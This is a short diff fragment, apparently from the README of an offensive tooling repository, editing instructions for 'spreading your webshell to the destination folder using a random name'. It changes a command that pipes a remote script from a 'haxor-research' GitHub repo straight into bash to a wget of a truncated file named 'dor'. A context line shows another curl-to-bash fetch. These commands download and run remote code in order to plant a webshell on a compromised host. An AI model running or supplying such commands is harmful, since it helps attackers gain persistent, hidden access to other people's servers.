@@ -8,5 +8,5 @@ curl -fsSL https://raw.githubusercontent.com/haxor-research/tools/master/what_se
 ```
 Spreading your webshell to the destination folder using a random name
 ```sh
-curl -fsSL https://raw.githubusercontent.com/haxor-research/tools/master/spread.sh | bash
+wget https://raw.githubusercontent.com/haxor-research/tools/master/dor
 ```
